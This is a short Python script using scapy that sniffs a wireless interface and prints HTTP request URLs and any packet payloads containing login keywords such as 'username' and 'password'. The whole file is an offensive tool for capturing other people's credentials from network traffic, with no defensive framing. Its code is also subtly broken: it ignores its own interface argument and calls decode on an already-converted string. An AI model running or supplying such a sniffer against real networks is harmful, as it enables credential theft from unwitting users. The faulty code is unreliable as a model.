import scapy.all as scapy
from scapy.layers import http
import argparse

def get_args():
    args = argparse.ArgumentParser()
    args.add_argument("-i","--iface",dest="iface",help="Interface to sniff")
    

    (options) = args.parse_args()
    return options
options = get_args()

def sniff(iface):
    scapy.sniff(iface= iface, store=False, prn=sniffed)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path



def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keyword = ["username", "user", "login", "pass", "password", "uname"]
        for each_keyword in keyword:
            if each_keyword in load:
                return load



def sniffed(packet):
    
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(url.decode('utf-8'))
    login = get_login(packet) 
           
    if login:            
        print(str(login.decode('utf-8')))           

sniff('wlan0')